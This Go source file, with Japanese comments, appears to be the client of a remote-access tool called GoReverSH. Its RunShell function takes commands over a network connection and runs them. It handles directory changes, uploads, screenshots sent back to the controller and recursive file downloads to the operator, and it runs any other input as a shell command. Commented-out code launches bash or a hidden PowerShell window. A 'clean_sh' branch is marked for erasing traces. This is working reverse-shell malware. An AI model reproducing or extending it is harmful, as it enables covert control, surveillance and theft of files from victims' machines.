package pkgclient

import (
	"GoReverSH/config"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

func RunShell(conn net.Conn) error {
	defer conn.Close()

	//receiver のパターンと同じにする
	for {
		cmdBuff := make([]byte, 1024)
		n, err := conn.Read(cmdBuff)
		if err != nil {
			if errors.Is(err, io.EOF) {
				log.Println("disconnect")
				return err
			}
			log.Println(err)
			return err
		}

		commands := strings.Split(string(cmdBuff[:n]), " ")

		//コマンドの引数の数もチェックすること
		switch commands[0] {
		case "cd":
			if len(commands) != 2 {
				//message
				continue
			}
			dir := commands[len(commands)-1]
			os.Chdir(string(dir))

		case "upload":
			if len(commands) != 2 {
				//message
				continue
			}
			//execUpload
			fileName := commands[len(commands)-1]
			err := ExecUpload(fileName, conn)
			if err != nil {
				log.Println(err)
				continue
			}
			/*
				filePath := strings.Split(commands[len(commands)-1], "/")
				lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
				//dir := "upload/"
				dir := config.Config.UploadDIr
				if _, err := os.Stat(dir + lastPathFromRecievedFile); os.IsNotExist(err) {
					if err2 := os.MkdirAll(dir+lastPathFromRecievedFile, 0755); err2 != nil {
						log.Fatalf("Could not create the path %s", dir)
					}
				}
				fileName := commands[len(commands)-1]
				fmt.Println(fileName)
				//read
				//最終的な入れ物
				var content []byte
				//読み込むもの
				buf := make([]byte, 1024)
				//読み込む位置
				size := 0

				for {
					//ファイルを読み込む
					n, err := conn.Read(buf)
					if err != nil {
						if n == 0 || err == io.EOF {
							break
						}
						log.Println(err)
						break
					}
					//content + bufの中身を一時的に保存。
					tmp := make([]byte, 0, size+n)
					tmp = append(content[:size], buf[:n]...)
					content = tmp
					size += n
					if n < 1024 {
						break
					}
				}

				//save
				src := filepath.Join(dir, fileName)
				file, err := os.Create(src)
				if err != nil {
					log.Println(err)
					break
				}
				base64ToData, err := base64.StdEncoding.DecodeString(string(content))
				_, err = file.Write(base64ToData)
				if err != nil {
					file.Close()
					log.Println(err)
					break
				}
				err = file.Close()
				if err != nil {
					log.Println(err)
					break
				}
				fmt.Println("content save")
			*/

		case "screenshot": //ex: screenshot
			//スクリーンショットを撮影し送信
			outdir := config.Config.ScreenshotDir

			filenames, err := Getscreenshot(outdir)
			if err != nil {
				log.Println(err)
				continue
			}

			err = SendFile(filenames, conn)
			if err != nil {
				log.Println(err)
				continue
			}

			fmt.Println("screenshot finished")

		case "download": //ex: download [path]
			//execDownload
			if len(commands) != 2 {
				//message
				continue
			}

			//ファイルシステム構築
			rootPath := commands[len(commands)-1]
			err := ExecDownload(rootPath, conn)
			if err != nil {
				log.Println(err)
			}
			/*
				fsys := os.DirFS(rootPath)
				err := fs.WalkDir(fsys, ".", func(path string, d fs.DirEntry, err error) error {
					if err != nil {
						log.Println(err)
						return errors.New("failed filepath.Walk: " + err.Error())
					}
					if d.IsDir() {
						log.Println(1)

						return nil
					}

					f, err := os.Open(rootPath + "/" + path)
					if err != nil {
						log.Println(err)

						return err
					}

					fstats, err := f.Stat()
					if err != nil {
						log.Println(err)

						return err
					}

					var content []byte
					buff := make([]byte, 1024)
					size := 0

					for {
						n, err := f.Read(buff)
						if err != nil {
							if n == 0 || errors.Is(err, io.EOF) {
								break
							}
							log.Println(err)
							break
						}
						//content + bufの中身を一時的に保存。
						tmp := make([]byte, 0, size+n)
						tmp = append(content[:size], buff[:n]...)
						content = tmp
						size += n
						if n < 1024 {
							break
						}
					}

					imageToBase64 := base64.StdEncoding.EncodeToString(content)
					fileinfo := utils.FileInfo{Name: "download/" + rootPath + "/" + path, Body: []byte(imageToBase64), Size: fstats.Size()}

					output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

					err = json.NewEncoder(conn).Encode(output)
					if err != nil {
						return nil
					}

					f.Close()

					return nil
				})
				if err != nil {
					log.Println(err)
				}
			*/

		case "clean_sh": //痕跡消去 ex: clean_go_reversh
			//execCleanSh
			//tips/main11.goを参考
			fmt.Println("CLEAN")

			//clean flagをつけて、正常終了
			//その後、コマンドでファイルを全消去する
			//sleep 5 && rm .

			os.Exit(0)

		default:
			//execCommand
			err := ExecCommand(string(cmdBuff[:n]), conn)
			if err != nil {
				log.Println(err)
			}
			/*
				var cmd *exec.Cmd
				//mac linux or windows
				if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
					cmd = exec.Command("/bin/bash", "-c", string(cmdBuff[:n]))
				} else if runtime.GOOS == "windows" {
					cmd = exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", string(cmdBuff[:n]))
				}
				out, err := cmd.Output()
				if err != nil {
					log.Println(err)
					//return
				}

				output := utils.Output{Type: utils.MESSAGE, Message: out}
				err = json.NewEncoder(conn).Encode(output)
				if err != nil {
					log.Println(err)
					return err
				}
			*/
		}
	}
}
